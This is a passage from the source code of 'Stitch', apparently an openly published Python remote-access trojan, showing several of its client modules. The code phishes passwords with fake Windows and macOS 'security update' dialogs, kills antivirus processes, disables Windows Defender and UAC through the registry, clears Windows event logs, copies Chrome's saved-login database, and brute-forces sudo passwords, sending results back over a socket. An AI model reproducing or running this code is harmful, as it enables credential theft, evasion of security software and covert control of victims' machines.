FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

Stitch also uses some code source/libraries from other projects under different licenses. Among these project, you may find :
    -For the packages located in Configuration/:
        - creddump software is under GPLv3 license, you can see the full license terms in Configuration/creddump/COPYING
            https://github.com/Neohapsis/creddump7
             - the Configuration/creddump folder only contains and uses the following files:
                addrspace.py
                hashdump.py
                newobj.py
                obj.py
                rawreg.py
                types.py
        - pyxhook.py by Tim Alexander (dragonfyre13@gmail.com) under the GNU General Public License.
            https://github.com/JeffHoogland/pyxhook/blob/master/pyxhook.py
        - vidcap.pyd from VideoCapture by Markus Gritsch (m.gritsch@gmail.com) under the LGPL License.
            http://videocapture.sourceforge.net/
    -For the packages located in Tools/:
        - makeself by Stéphane Peter under the GNU General Public License.
            http://stephanepeter.com/makeself/
            - modified makeself-header.sh to remove itself line 509: /bin/rm -rf "\$0"
        - Shoutout to ImageSnap who does not have a license.
            https://github.com/rharder/imagesnap

All icons used in Icons/ are free for commercial use. From https://www.iconfinder.com/free_icons:
    https://www.iconfinder.com/icons/10623/browser_chrome_google_logo_icon#size=128
    https://www.iconfinder.com/icons/10629/apple_brower_browser_compass_ne_north_east_safari_icon#size=128
    https://www.iconfinder.com/icons/63467/database_storage_icon#size=128
    https://www.iconfinder.com/icons/63468/disk_server_icon#size=128

```

`PyLib/askpass.py`:

```py
# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

import sys
import subprocess

response = ''
if win_client():
    while True:
        cmd1 = "$cred=$host.ui.promptforcredential('Windows Security Update','',[Environment]::UserName,[Environment]::UserDomainName);"
        cmd2 = 'echo $cred.getnetworkcredential().password;'
        full_cmd = 'Powershell "{} {}"'.format(cmd1,cmd2)
        response = run_command(full_cmd)
        if response.strip() != '' and not response.strip().startswith('[!]'): break
    response = '[+] Password: {}'.format(response.strip())
    send(client_socket,response)

if osx_client():
    while True:
        sftware = '/System/Library/CoreServices/Software Update.app/Contents/Resources/SoftwareUpdate.icns'
        alert = '/System/Library/CoreServices/CoreTypes.bundle/Contents/Resources/AlertCautionIcon.icns'
        if os.path.exists(sftware):
            cmd = "osascript -e 'Tell application \"System Events\" to display dialog \"Software Security Updates are required.\nTo update, please enter your password:\" buttons {\"OK\"} default button \"OK\" with hidden answer default answer \"\" with icon file \"/System/Library/CoreServices/Software Update.app/Contents/Resources/SoftwareUpdate.icns\" as alias' -e 'text returned of result'"
        elif os.path.exists(alert):
            cmd = "osascript -e 'Tell application \"System Events\" to display dialog \"Software Security Updates are required.\nTo update, please enter your password:\" buttons {\"OK\"} default button \"OK\" with hidden answer default answer \"\" with icon file \"/System/Library/CoreServices/CoreTypes.bundle/Contents/Resources/AlertCautionIcon.icns\" as alias' -e 'text returned of result'"
        else:
            cmd = "osascript -e 'Tell application \"System Events\" to display dialog \"Software Security Updates are required.\nTo update, please enter your password:\" buttons {\"OK\"} default button \"OK\" with hidden answer default answer \"\" with icon caution' -e 'text returned of result'"
        response=run_command(cmd)
        if response.strip() == '':
            cmd = "osascript -e 'Tell application \"System Events\" to display notification \"Software Security Updates are required.\nPlease enter your password.\" with title \"Apple Security\" '"
            cmd=run_command(cmd)
        else:
            response = "[+] Password: {}".format(response.strip())
            break

    send(client_socket,response)

```

`PyLib/avkiller.py`:

```py
# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

import _winreg
import subprocess

avs = [
  'a2adguard.exe',
  'a2adwizard.exe',
  'a2antidialer.exe',
  'a2cfg.exe',
  'a2cmd.exe',
  'a2free.exe',
  'a2guard.exe',
  'a2hijackfree.exe',
  'a2scan.exe',
  'a2service.exe',
  'a2start.exe',
  'a2sys.exe',
  'a2upd.exe',
  'aavgapi.exe',
  'aawservice.exe',
  'aawtray.exe',
  'ad-aware.exe',
  'ad-watch.exe',
  'alescan.exe',
  'anvir.exe',
  'ashdisp.exe',
  'ashmaisv.exe',
  'ashserv.exe',
  'ashwebsv.exe',
  'aswupdsv.exe',
  'atrack.exe',
  'avgagent.exe',
  'avgamsvr.exe',
  'avgcc.exe',
  'avgctrl.exe',
  'avgemc.exe',
  'avgnt.exe',
  'avgtcpsv.exe',
  'avguard.exe',
  'avgupsvc.exe',
  'avgw.exe',
  'avkbar.exe',
  'avk.exe',
  'avkpop.exe',
  'avkproxy.exe',
  'avkservice.exe',
  'avktray',
  'avktray.exe',
  'avkwctl',
  'avkwctl.exe',
  'avmailc.exe',
  'avp.exe',
  'avpm.exe',
  'avpmwrap.exe',
  'avsched32.exe',
  'avwebgrd.exe',
  'avwin.exe',
  'avwupsrv.exe',
  'avz.exe',
  'bdagent.exe',
  'bdmcon.exe',
  'bdnagent.exe',
  'bdss.exe',
  'bdswitch.exe',
  'blackd.exe',
  'blackice.exe',
  'blink.exe',
  'boc412.exe',
  'boc425.exe',
  'bocore.exe',
  'bootwarn.exe',
  'cavrid.exe',
  'cavtray.exe',
  'ccapp.exe',
  'ccevtmgr.exe',
  'ccimscan.exe',
  'ccproxy.exe',
  'ccpwdsvc.exe',
  'ccpxysvc.exe',
  'ccsetmgr.exe',
  'cfgwiz.exe',
  'cfp.exe',
  'clamd.exe',
  'clamservice.exe',
  'clamtray.exe',
  'cmdagent.exe',
  'cpd.exe',
  'cpf.exe',
  'csinsmnt.exe',
  'dcsuserprot.exe',
  'defensewall.exe',
  'defensewall_serv.exe',
  'defwatch.exe',
  'f-agnt95.exe',
  'fpavupdm.exe',
  'f-prot95.exe',
  'f-prot.exe',
  'fprot.exe',
  'fsaua.exe',
  'fsav32.exe',
  'f-sched.exe',
  'fsdfwd.exe',
  'fsm32.exe',
  'fsma32.exe',
  'fssm32.exe',
  'f-stopw.exe',
  'f-stopw.exe',
  'fwservice.exe',
  'fwsrv.exe',
  'iamstats.exe',
  'iao.exe',
  'icload95.exe',
  'icmon.exe',
  'idsinst.exe',
  'idslu.exe',
  'inetupd.exe',
  'irsetup.exe',
  'isafe.exe',
  'isignup.exe',
  'issvc.exe',
  'kav.exe',
  'kavss.exe',
  'kavsvc.exe',
  'klswd.exe',
  'kpf4gui.exe',
  'kpf4ss.exe',
  'livesrv.exe',
  'lpfw.exe',
  'mcagent.exe',
  'mcdetect.exe',
  'mcmnhdlr.exe',
  'mcrdsvc.exe',
  'mcshield.exe',
  'mctskshd.exe',
  'mcvsshld.exe',
  'mghtml.exe',
  'mpftray.exe',
  'msascui.exe',
  'mscifapp.exe',
  'msfwsvc.exe',
  'msgsys.exe',
  'msssrv.exe',
  'navapsvc.exe',
  'navapw32.exe',
  'navlogon.dll',
  'navstub.exe',
  'navw32.exe',
  'nisemsvr.exe',
  'nisum.exe',
  'nmain.exe',
  'noads.exe',
  'nod32krn.exe',
  'nod32kui.exe',
  'nod32ra.exe',
  'npfmntor.exe',
  'nprotect.exe',
  'nsmdtr.exe',
  'oasclnt.exe',
  'ofcdog.exe',
  'opscan.exe',
  'ossec-agent.exe',
  'outpost.exe',
  'paamsrv.exe',
  'pavfnsvr.exe',
  'pcclient.exe',
  'pccpfw.exe',
  'pccwin98.exe',
  'persfw.exe',
  'protector.exe',
  'qconsole.exe',
  'qdcsfs.exe',
  'rtvscan.exe',
  'sadblock.exe',
  'safe.exe',
  'sandboxieserver.exe',
  'savscan.exe',
  'sbiectrl.exe',
  'sbiesvc.exe',
  'sbserv.exe',
  'scfservice.exe',
  'sched.exe',
  'schedm.exe',
  'scheduler daemon.exe',
  'sdhelp.exe',
  'serv95.exe',
  'sgbhp.exe',
  'sgmain.exe',
  'slee503.exe',
  'smartfix.exe',
  'smc.exe',
  'snoopfreesvc.exe',
  'snoopfreeui.exe',
  'spbbcsvc.exe',
  'sp_rsser.exe',
  'spyblocker.exe',
  'spybotsd.exe',
  'spysweeper.exe',
  'spysweeperui.exe',
  'spywareguard.dll',
  'spywareterminatorshield.exe',
  'ssu.exe',
  'steganos5.exe',
  'stinger.exe',
  'swdoctor.exe',
  'swupdate.exe',
  'symlcsvc.exe',
  'symundo.exe',
  'symwsc.exe',
  'symwscno.exe',
  'tcguard.exe',
  'tds2-98.exe',
  'tds-3.exe',
  'teatimer.exe',
  'tgbbob.exe',
  'tgbstarter.exe',
  'tsatudt.exe',
  'umxagent.exe',
  'umxcfg.exe',
  'umxfwhlp.exe',
  'umxlu.exe',
  'umxpol.exe',
  'umxtray.exe',
  'usrprmpt.exe',
  'vetmsg9x.exe',
  'vetmsg.exe',
  'vptray.exe',
  'vsaccess.exe',
  'vsserv.exe',
  'wcantispy.exe',
  'win-bugsfix.exe',
  'winpatrol.exe',
  'winpa'"'"'rolex.exe',
  'wrsssdk.exe',
  'xcommsvr.exe',
  'xfr.exe',
  'xp-antispy.exe',
  'zegarynka.exe',
  'zlclient.exe'
]

pid = []
process_list = []
process = run_command('wmic process get name, ProcessId')
process = process.split('\n')
for proc in process:
    proc = proc.strip()
    p = proc.split()
    if len(p) > 1:
        name = p[0]
        procid = p[1]
        if 'exe' in name:
            if name in avs:
                process_list.append(proc)
                pid.append(p[1])

if len(process_list) > 0 and len(process_list) == len(pid):
    av_summary = 'Terminating all Possible AVs, HIPS and/or Third Party firewalls:\n'
    av_summary += 'Image Name:\t\t    PID:'
    av_summary += '===========\t\t    ===='
    for n in process_list:
        av_summary += n
    i = 0
    while i < len(pid):
        run_command('Taskkill /PID %s /F' % pid[i])
        i += 1
    av_summary += '\n\nTerminations are complete.'
else:
    av_summary = "No AVs, HIPS and/or Third Party firewalls detected.\n"
send(client_socket,av_summary)

```

`PyLib/avscan_posix.py`:

```py
# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

import subprocess

def av_scan(av):
    if osx_client():
        av_check = run_command('kextstat')
    elif lnx_client():
        av_check = run_command('lsmod')
    for line in av_check:
        if av in av_check:
            return line
    return False

escan = av_scan('eScan')
avira = av_scan('Avira')
panda = av_scan('Panda')
sophos = av_scan('Sophos')
ahnlab = av_scan('AhnLab')
mcafee = av_scan('McAfee')
bguard = av_scan('BullGuard')
fsecure = av_scan('F-Secure')
symantec = av_scan('Symantec')
bitdef = av_scan('BitDefender')
tmicro = av_scan('Trend Micro')

av_summary = ''
if avira: av_summary += 'Avira Antivirus:\t\tDetected\n'
if panda: av_summary += 'Panda Antivirus:\t\tDetected\n'
if mcafee: av_summary += 'McAfee Antivirus:\t\tDetected\n'
if sophos: av_summary += 'Sophos Antivirus:\t\tDetected\n'
if ahnlab: av_summary += 'AhnLab V3 Antirus:\t\tDetected\n'
if bguard: av_summary += 'BullGuard Antirus:\t\tDetected\n'
if bitdef: av_summary += 'BitDefender Antirus:\t\tDetected\n'
if fsecure: av_summary += 'F-Secure Antivirus:\t\tDetected\n'
if escan: av_summary += 'escan Micro Antivirus:\t\tDetected\n'
if symantec: av_summary += 'Symantec Antivirus:\t\tDetected\n'
if tmicro: av_summary += 'Trend Micro Antivirus:\t\tDetected\n'

if (not mcafee and not sophos and not ahnlab \
    and not symantec and not avira and not panda \
    and not bitdef and not fsecure and not bguard \
    and not tmicro and not escan):
    av_summary += 'No Antiviruses detected.\n'

send(client_socket,av_summary)

```

`PyLib/avscan_win.py`:

```py
# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

import _winreg
import subprocess

avs = [
  'a2adguard.exe',
  'a2adwizard.exe',
  'a2antidialer.exe',
  'a2cfg.exe',
  'a2cmd.exe',
  'a2free.exe',
  'a2guard.exe',
  'a2hijackfree.exe',
  'a2scan.exe',
  'a2service.exe',
  'a2start.exe',
  'a2sys.exe',
  'a2upd.exe',
  'aavgapi.exe',
  'aawservice.exe',
  'aawtray.exe',
  'ad-aware.exe',
  'ad-watch.exe',
  'alescan.exe',
  'anvir.exe',
  'ashdisp.exe',
  'ashmaisv.exe',
  'ashserv.exe',
  'ashwebsv.exe',
  'aswupdsv.exe',
  'atrack.exe',
  'avgagent.exe',
  'avgamsvr.exe',
  'avgcc.exe',
  'avgctrl.exe',
  'avgemc.exe',
  'avgnt.exe',
  'avgtcpsv.exe',
  'avguard.exe',
  'avgupsvc.exe',
  'avgw.exe',
  'avkbar.exe',
  'avk.exe',
  'avkpop.exe',
  'avkproxy.exe',
  'avkservice.exe',
  'avktray',
  'avktray.exe',
  'avkwctl',
  'avkwctl.exe',
  'avmailc.exe',
  'avp.exe',
  'avpm.exe',
  'avpmwrap.exe',
  'avsched32.exe',
  'avwebgrd.exe',
  'avwin.exe',
  'avwupsrv.exe',
  'avz.exe',
  'bdagent.exe',
  'bdmcon.exe',
  'bdnagent.exe',
  'bdss.exe',
  'bdswitch.exe',
  'blackd.exe',
  'blackice.exe',
  'blink.exe',
  'boc412.exe',
  'boc425.exe',
  'bocore.exe',
  'bootwarn.exe',
  'cavrid.exe',
  'cavtray.exe',
  'ccapp.exe',
  'ccevtmgr.exe',
  'ccimscan.exe',
  'ccproxy.exe',
  'ccpwdsvc.exe',
  'ccpxysvc.exe',
  'ccsetmgr.exe',
  'cfgwiz.exe',
  'cfp.exe',
  'clamd.exe',
  'clamservice.exe',
  'clamtray.exe',
  'cmdagent.exe',
  'cpd.exe',
  'cpf.exe',
  'csinsmnt.exe',
  'dcsuserprot.exe',
  'defensewall.exe',
  'defensewall_serv.exe',
  'defwatch.exe',
  'f-agnt95.exe',
  'fpavupdm.exe',
  'f-prot95.exe',
  'f-prot.exe',
  'fprot.exe',
  'fsaua.exe',
  'fsav32.exe',
  'f-sched.exe',
  'fsdfwd.exe',
  'fsm32.exe',
  'fsma32.exe',
  'fssm32.exe',
  'f-stopw.exe',
  'f-stopw.exe',
  'fwservice.exe',
  'fwsrv.exe',
  'iamstats.exe',
  'iao.exe',
  'icload95.exe',
  'icmon.exe',
  'idsinst.exe',
  'idslu.exe',
  'inetupd.exe',
  'irsetup.exe',
  'isafe.exe',
  'isignup.exe',
  'issvc.exe',
  'kav.exe',
  'kavss.exe',
  'kavsvc.exe',
  'klswd.exe',
  'kpf4gui.exe',
  'kpf4ss.exe',
  'livesrv.exe',
  'lpfw.exe',
  'mcagent.exe',
  'mcdetect.exe',
  'mcmnhdlr.exe',
  'mcrdsvc.exe',
  'mcshield.exe',
  'mctskshd.exe',
  'mcvsshld.exe',
  'mghtml.exe',
  'mpftray.exe',
  'msascui.exe',
  'mscifapp.exe',
  'msfwsvc.exe',
  'msgsys.exe',
  'msssrv.exe',
  'navapsvc.exe',
  'navapw32.exe',
  'navlogon.dll',
  'navstub.exe',
  'navw32.exe',
  'nisemsvr.exe',
  'nisum.exe',
  'nmain.exe',
  'noads.exe',
  'nod32krn.exe',
  'nod32kui.exe',
  'nod32ra.exe',
  'npfmntor.exe',
  'nprotect.exe',
  'nsmdtr.exe',
  'oasclnt.exe',
  'ofcdog.exe',
  'opscan.exe',
  'ossec-agent.exe',
  'outpost.exe',
  'paamsrv.exe',
  'pavfnsvr.exe',
  'pcclient.exe',
  'pccpfw.exe',
  'pccwin98.exe',
  'persfw.exe',
  'protector.exe',
  'qconsole.exe',
  'qdcsfs.exe',
  'rtvscan.exe',
  'sadblock.exe',
  'safe.exe',
  'sandboxieserver.exe',
  'savscan.exe',
  'sbiectrl.exe',
  'sbiesvc.exe',
  'sbserv.exe',
  'scfservice.exe',
  'sched.exe',
  'schedm.exe',
  'scheduler daemon.exe',
  'sdhelp.exe',
  'serv95.exe',
  'sgbhp.exe',
  'sgmain.exe',
  'slee503.exe',
  'smartfix.exe',
  'smc.exe',
  'snoopfreesvc.exe',
  'snoopfreeui.exe',
  'spbbcsvc.exe',
  'sp_rsser.exe',
  'spyblocker.exe',
  'spybotsd.exe',
  'spysweeper.exe',
  'spysweeperui.exe',
  'spywareguard.dll',
  'spywareterminatorshield.exe',
  'ssu.exe',
  'steganos5.exe',
  'stinger.exe',
  'swdoctor.exe',
  'swupdate.exe',
  'symlcsvc.exe',
  'symundo.exe',
  'symwsc.exe',
  'symwscno.exe',
  'tcguard.exe',
  'tds2-98.exe',
  'tds-3.exe',
  'teatimer.exe',
  'tgbbob.exe',
  'tgbstarter.exe',
  'tsatudt.exe',
  'umxagent.exe',
  'umxcfg.exe',
  'umxfwhlp.exe',
  'umxlu.exe',
  'umxpol.exe',
  'umxtray.exe',
  'usrprmpt.exe',
  'vetmsg9x.exe',
  'vetmsg.exe',
  'vptray.exe',
  'vsaccess.exe',
  'vsserv.exe',
  'wcantispy.exe',
  'win-bugsfix.exe',
  'winpatrol.exe',
  'winpa'"'"'rolex.exe',
  'wrsssdk.exe',
  'xcommsvr.exe',
  'xfr.exe',
  'xp-antispy.exe',
  'zegarynka.exe',
  'zlclient.exe'
]

def scan_reg(antivirus):
    reg = reg_exists('SOFTWARE\\%s' % antivirus)
    if not reg: reg = reg_exists('SYSTEM\\%s AntiVirus' % antivirus)
    if not reg: reg = reg_exists('SOFTWARE\\Wow6432Node\\%s' % antivirus)
    if not reg: reg = reg_exists('SYSTEM\\CurrentControlSet\\Services\\%s AntiVirus' % antivirus)
    if not reg: reg = reg_exists('SOFTWARE\\Microsoft\\Security Center\\Monitoring\\%sAntiVirus' % antivirus)
    if not reg: return False
    else: return True

def windefnd_scan():
    defender = reg_exists('SOFTWARE\\Microsoft\\Windows Defender')
    if not defender: defender = reg_exists('SOFTWARE\\Policies\\Microsoft\\Windows Defender')
    if not defender: return False
    else: return True

def windefnd_running():
    key = False
    if reg_exists('SOFTWARE\\Policies\\Microsoft\\Windows Defender'):
        key = _winreg.OpenKey(_winreg.HKEY_LOCAL_MACHINE,'SOFTWARE\\Policies\\Microsoft\\Windows Defender')
    elif reg_exists('SOFTWARE\\Microsoft\\Windows Defender'):
        key = _winreg.OpenKey(_winreg.HKEY_LOCAL_MACHINE,'SOFTWARE\\Microsoft\\Windows Defender')
    if key:
        try:
            val=_winreg.QueryValueEx(key, "DisableAntiSpyware")
            if val[0] == 1:
                return "Windows Defender:\t\tDisabled\n"
            else:
                return "Windows Defender:\t\tRunning\n"
        except:
            return "Windows Defender:\t\tRunning\n"

process_list = []
av_summary = ''
process = run_command('wmic process get name, ProcessId')
process = process.split('\n')
for proc in process:
    proc = proc.strip()
    name= proc.split(' ')[0]
    if 'exe' in name:
        if name in avs:
            process_list.append(proc)

windefnd = windefnd_scan()
escan = scan_reg('eScan')
avira = scan_reg('Avira')
panda = scan_reg('Panda')
sophos = scan_reg('Sophos')
ahnlab = scan_reg('AhnLab')
mcafee = scan_reg('McAfee')
bguard = scan_reg('BullGuard')
fsecure = scan_reg('F-Secure')
symantec = scan_reg('Symantec')
bitdef = scan_reg('BitDefender')
tmicro = scan_reg('Trend Micro')

if avira: av_summary += 'Avira Antivirus:\t\tDetected\n'
if panda: av_summary += 'Panda Antivirus:\t\tDetected\n'
if mcafee: av_summary += 'McAfee Antivirus:\t\tDetected\n'
if sophos: av_summary += 'Sophos Antivirus:\t\tDetected\n'
if ahnlab: av_summary += 'AhnLab V3 Antirus:\t\tDetected\n'
if bguard: av_summary += 'BullGuard Antirus:\t\tDetected\n'
if bitdef: av_summary += 'BitDefender Antirus:\t\tDetected\n'
if fsecure: av_summary += 'F-Secure Antivirus:\t\tDetected\n'
if escan: av_summary += 'escan Micro Antivirus:\t\tDetected\n'
if symantec: av_summary += 'Symantec Antivirus:\t\tDetected\n'
if tmicro: av_summary += 'Trend Micro Antivirus:\t\tDetected\n'
if windefnd: av_summary += windefnd_running()

if (not mcafee and not sophos and not ahnlab \
    and not symantec and not avira and not panda \
    and not bitdef and not fsecure and not bguard \
    and not tmicro and not escan and not windefnd):
    av_summary += 'No AVs, HIPS and/or Third Party firewalls detected.'

send(client_socket,av_summary)
av_summary = ''

if len(process_list) > 0:
    av_summary += 'Possible AVs, HIPS and/or Third Party firewalls:\n'
    av_summary += 'Image Name:\t\t    PID:\n'
    av_summary += '===========\t\t    ====\n'
    for n in process_list:
        av_summary += n
else:
    av_summary += "No AVs, HIPS and/or Third Party firewalls detected.\n"

send(client_socket,av_summary)

```

`PyLib/cat.py`:

```py
# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

import os

read_file = receive(client_socket)
if os.path.exists(read_file):
    if os.path.isfile(read_file):
        try:
            with open (read_file,'rb') as n:
                send(client_socket,'SUCCESS')
                line = n.read(1024)
                while line:
                    send(client_socket,line)
                    line=n.read(1024)
                send(client_socket, st_complete)
        except Exception as e:
            err = '[!] {}'.format(str(e))
            send(client_socket,err)
    else:
        err = "ERROR: {}/: Is a directory\n".format(read_file)
        send(client_socket, err)
else:
    err = "ERROR: {}: No such file or directory\n".format(read_file)
    send(client_socket,err)

```

`PyLib/cd.py`:

```py
# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

import os

cd_dir = receive(client_socket)
if os.path.exists(cd_dir):
    if os.path.isdir(cd_dir):
        os.chdir(cd_dir)
        path_name = get_path()
        resp = "Directory change successful"
        send(client_socket, resp)
    else:
        err = "[!] {}: Is not a directory\n".format(cd_dir)
        send(client_socket, err)
else:
    err = "[!] {}: No such directory\n".format(cd_dir)
    send(client_socket,err)

```

`PyLib/chromedump.py`:

```py
# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.
# based from https://github.com/hassaanaliw/chromepass/blob/master/chromepass.py
import os,sys

def get_chrome_path():
    if win_client():
        PathName = os.getenv('localappdata') + '\\Google\\Chrome\\User Data\\Default\\'
        if (os.path.isdir(PathName) == False):
            return "[!] Chrome Doesn't exists", False
    if osx_client():
        PathName = os.getenv('HOME') + "/Library/Application Support/Google/Chrome/Default/"
        if (os.path.isdir(PathName) == False):
            return "[!] Chrome Doesn't exists", False
    if lnx_client():
        PathName = os.getenv('HOME') + '/.config/google-chrome/Default/'
        if (os.path.isdir(PathName) == False):
            return "[!] Chrome Doesn't exists", False
    return PathName, True

if win_client():
    temp = 'C:\\Windows\\Temp\\'
else:
    temp = '/tmp/'

info_list = ''
path, success = get_chrome_path()
if success:
    path = os.path.join(path,"Login Data")
    new_path = os.path.join(temp,'c_log_626')
    if os.path.exists(path):
        shutil.copyfile(path, new_path)
        send(client_socket,"SUCCESS")
    else:
        err = '[!] The path "{}" does not exist.'.format(path)
        send(client_socket,err)
else:
    err = '[!] The path "{}" does not exist.'.format(path)
    send(client_socket,err)

```

`PyLib/clearev.py`:

```py
# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

import subprocess

sys_log = run_command('wevtutil cl System')
sec_log = run_command('wevtutil cl Security')
app_log = run_command('wevtutil cl Application')

summary=''
if no_error(sys_log):
    if no_error(sec_log):
        if no_error(app_log):
            send(client_socket,'[+] System, Security, and Application logs have been cleared.\n')
        else:
            send(client_socket,app_log)
    else:
        send(client_socket,sec_log)
else:
    send(client_socket,sys_log)

```

`PyLib/crackpassword.py`:

```py
# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

import os
import sys
import socket
import pexpect
import subprocess

while True:
    cmd = 'echo password_cracked'
    child = pexpect.spawn('sudo {}'.format(cmd))
    passw = ['Password.*:','.*password.*:']
    try:
        child.expect(passw,timeout=2)
    except Exception as e:
        child.close
        cmd = run_command("sudo {}".format(cmd))
        if cmd.strip() == 'password_cracked':
            send(client_socket,'sudo_failed')
            break
    send(client_socket,'sudo_success')
    n = receive(client_socket)
    if n != 'password_list_failed':
        try:
            failure = ['.*try again.*assword.*:','.*try again.*sudo: 3 incorrect password attempts.*']
            child.sendline(n)
            i = child.expect(failure, timeout=2)
        except Exception as e:
            cmd = child.before
            if cmd.strip() == 'password_cracked':
                send(client_socket,'password_cracked')
                child.close()
                break
        send(client_socket,'password_failed')
        child.close
    else:
        break

```

`PyLib/depscan.py`:

```py
# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

import _winreg
import subprocess

def check_dep():
    dep = subprocess.Popen('wmic OS get DataExecutionPrevention_SupportPolicy',shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
    dep_mode, errors = dep.communicate()
    if not errors and dep_mode:
        if "0" in dep_mode:
            return "DEP is off for the whole system."
        elif "1" in dep_mode:
            return "Full DEP coverage for the whole system with no exceptions."
        elif "2" in dep_mode:
            return "DEP is limited to Windows system binaries."
        elif "3" in dep_mode:
            return "DEP is on for all programs and services."
    else:
        return errors

print check_dep()

```

`PyLib/disableRDP.py`:

```py
# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

import _winreg
import subprocess

def disable_rdp():
    return run_command('REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f')

def check_rdp():
    rdp_key = _winreg.OpenKey(_winreg.HKEY_LOCAL_MACHINE, 'SYSTEM\\CurrentControlSet\\Control\\Terminal Server')
    val=_winreg.QueryValueEx(rdp_key, "fDenyTSConnections")
    if val[0] == 1:
        return False
    else:
        return True

if check_rdp():
    disable_rdp()
    if not check_rdp():
        send(client_socket, "[+] RDP is now Disabled\n")
    else:
        send(client_socket, "[!] Failed to disable RDP, RDP is still Enabled\n")
else:
    send(client_socket, "[*] RDP is already Disabled\n")

```

`PyLib/disableUAC.py`:

```py
# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

import _winreg
import subprocess

def disble_uac():
    return run_command("REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f")

def check_uac():
    uac_key = _winreg.OpenKey(_winreg.HKEY_LOCAL_MACHINE, 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System')
    val=_winreg.QueryValueEx(uac_key, "EnableLUA")
    if val[0] == 1:
        return True
    else:
        return False

if check_uac():
    disble_uac()
    if check_uac():
        send(client_socket, "[!] Failed to Disable UAC, UAC is still Enabled\n")
    else:
        send(client_socket, "[+] UAC is now Disabled, reboot is required\n")
else:
    send(client_socket, "[*] UAC is already disabled.\n")

```

`PyLib/disableWinDef.py`:

```py
# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

import _winreg
import subprocess

def windefnd_scan():
    defender = reg_exists('SOFTWARE\\Microsoft\\Windows Defender')
    if not defender: defender = reg_exists('SOFTWARE\\Policies\\Microsoft\\Windows Defender')
    if not defender: return False
    else: return True

def windefnd_running():
    key = False
    if reg_exists('SOFTWARE\\Policies\\Microsoft\\Windows Defender'):
        key = _winreg.OpenKey(_winreg.HKEY_LOCAL_MACHINE,'SOFTWARE\\Policies\\Microsoft\\Windows Defender')
    elif reg_exists('SOFTWARE\\Microsoft\\Windows Defender'):
        key = _winreg.OpenKey(_winreg.HKEY_LOCAL_MACHINE,'SOFTWARE\\Microsoft\\Windows Defender')
    if key:
        try:
            val=_winreg.QueryValueEx(key, "DisableAntiSpyware")
            if val[0] == 1:
                return False
            else:
                return True
        except:
            return False
    print "BROKEEEEEEN"

def disable_windef():
    if reg_exists('SOFTWARE\\Policies\\Microsoft\\Windows Defender'):
        return run_command('REG ADD "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f')
    elif reg_exists('SOFTWARE\\Microsoft\\Windows Defender'):
        return run_command('REG ADD "HKLM\\SOFTWARE\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f')


if windefnd_scan():
    if windefnd_running():
        disable_windef()
        if windefnd_running():
            resp = "[!] Failed to disable Windows Defender\n"
        else:
            resp = "[+] Windows Defender is now disabled\n"
    else:
        resp = "[+] Windows Defender is already disabled\n"
else:
    resp = "[*] Windows Defender not detected on the system\n"
send(client_socket,resp)

```

`PyLib/displayoff.py`:

```py
# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

import ctypes

if win_client():
    WM_SYSCOMMAND = 274
    HWND_BROADCAST = 65535
    SC_MONITORPOWER = 61808
    success = "[+] Command successfully executed.\n"
    ctypes.windll.user32.SendMessageW(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, 2)
    send(client_socket,success)
if osx_client():
    #('echo \'tell application "Finder" to sleep\' | osascript')
    resp=run_command('pmset displaysleepnow')
    send(client_socket,resp)
if lnx_client():
    resp=run_command('xset dpms force off')
    send(client_socket,resp)

```

`PyLib/displayon.py`:

```py
# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

import ctypes

if win_client():
    WM_SYSCOMMAND = 274
    HWND_BROADCAST = 65535
    SC_MONITORPOWER = 61808
    success = "[+] Command successfully executed.\n"
    ctypes.windll.user32.SendMessageW(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, -1)
    send(client_socket,success)
if osx_client():
    resp=run_command('caffeinate -u -t 2')
    send(client_socket,resp)
if lnx_client():
    resp=run_command('xset dpms force on')
    send(client_socket,resp)

```

`PyLib/download.py`:

```py
# Copyright (c) 2017, Nathan Lopez
